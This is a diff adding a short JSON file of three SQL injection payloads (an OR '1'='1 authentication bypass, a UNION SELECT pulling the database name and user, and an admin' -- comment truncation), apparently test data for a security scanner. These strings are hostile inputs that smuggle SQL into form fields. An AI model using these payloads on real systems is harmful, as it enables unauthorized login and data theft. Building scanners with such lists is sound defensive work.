@@ -1,0 +1,23 @@
+[
+    {
+        "id": "sqli_simple_or",
+        "name": "Simple OR Bypass",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "description": "Classic authentication bypass."
+    },
+    {
+        "id": "sqli_union_select",
+        "name": "Union Select",
+        "payload": "' UNION SELECT 1, database(), user() -- ",
+        "severity": "Critical",
+        "description": "Extracting data from other tables."
+    },
+    {
+        "id": "sqli_comment",
+        "name": "Comment Truncation",
+        "payload": "admin' --",
+        "severity": "High",
+        "description": "Truncating the rest of the query."
+    }
+]
